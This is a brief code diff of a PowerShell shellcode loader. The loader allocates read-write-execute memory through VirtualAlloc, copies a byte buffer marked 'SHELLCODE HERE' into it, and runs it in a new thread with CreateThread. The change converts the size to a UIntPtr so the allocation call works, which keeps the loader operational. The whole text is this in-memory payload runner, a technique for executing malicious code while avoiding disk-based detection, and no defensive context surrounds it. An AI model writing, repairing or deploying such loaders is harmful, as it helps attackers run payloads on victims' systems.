@@ -39,7 +39,8 @@ Add-Type $Shell32
 
 [Byte[]] $buf = SHELLCODE HERE
 $size = $buf.length
-[IntPtr]$addr = [Shell32]::VirtualAlloc(0,$size,0x3000,0x40);
+$sizeUIntPtr = New-Object System.UIntPtr $size
+[IntPtr]$addr = [Shell32]::VirtualAlloc(0,$sizeUIntPtr,0x3000,0x40);
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
 $thandle=[Shell32]::CreateThread(0,0,$addr,0,0,0);
 [Shell32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
